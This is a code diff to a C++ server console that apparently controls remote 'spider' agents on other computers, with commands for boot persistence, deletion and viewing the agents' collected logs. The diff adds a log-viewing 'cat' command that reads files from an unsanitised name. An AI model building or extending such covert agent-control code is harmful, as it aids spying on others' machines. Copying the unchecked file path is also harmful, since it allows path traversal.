@@ -18,6 +18,7 @@
 #include <dlfcn.h>
 
 #define PLUGINS_DIRECTORY ("./plugins")
+#define UNUSED __attribute__((__unused__))
 
 namespace fs = boost::filesystem;
 
@@ -35,9 +36,10 @@ Server::Server(uint16_t port)
   _commandsSpider["pause"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(7));
   _commandsSpider["destroy"] = boost::shared_ptr<PaquetCommandServer>(new PaquetCommandServer(8));
 
-  _commandsServer["list"] = [this]() -> int { return (_web->listSpider()); };
-  _commandsServer["quit"] = [this]() -> int { _web->stop(); return (1); };
-  _commandsServer["help"] = [this]() -> int { return (help()); };
+  _commandsServer["list"] = [this](const std::string &name UNUSED) -> int { return (_web->listSpider()); };
+  _commandsServer["quit"] = [this](const std::string &name UNUSED) -> int { _web->stop(); return (1); };
+  _commandsServer["help"] = [this](const std::string &name UNUSED) -> int { return (help()); };
+  _commandsServer["cat"] = [this](const std::string &name) -> int { return (cat(name)); };
 
   loadPlugins(PLUGINS_DIRECTORY);
 }
@@ -110,15 +112,42 @@ int		Server::help()
 	    << "\tpause [Spider1 ...]\t\t- Pause spiders" << std::endl
 	    << "\tdestroy [Spider1 ...]\t\t- Delete spiders from computers" << std::endl
 	    << "\tstartup [Spider1 ...]\t\t- Make spider run automatically on each boot" << std::endl
+	    << "\tcat Spider\t\t\t- Watch logs for spider" << std::endl
 	    << "\tlist\t\t\t\t- List spiders connected" << std::endl
 	    << "\tquit\t\t\t\t- Quit server" << std::endl
 	    << "\thelp\t\t\t\t- Disp help" << std::endl;
   return (0);
 }
 
+int		Server::cat(const std::string &name) {
+  std::string	filename = "./";
+  std::ifstream	file;
+
+  if (fs::is_directory("Logs")) {
+    filename += "Logs/";
+  }
+  filename += name;
+
+  file.open(filename, std::ifstream::in);
+
+  if (file.is_open()) {
+    char c = file.get();
+
+    while (file.good()) {
+      std::cout << c;
+      c = file.get();
+    }
+
+    file.close();
+  }
+  else {
+    std::cerr << "Can't get logs from " << name << std::endl;
+  }
+  return (0);
+}
+
 void		Server::readCommand()
 {
-  help();
   try {
 
     while (1) {
@@ -151,7 +180,14 @@ void		Server::readCommand()
 
 	for (auto &command : _commandsServer) {
 	  if (boost::equals(strs.front(), command.first)) {
-	    command.second();
+	    strs.pop_front();
+
+	    if (strs.size()) {
+	      command.second(strs.front());
+	    }
+	    else {
+	      command.second("");
+	    }
 	    found = 1;
 	  }
 	}
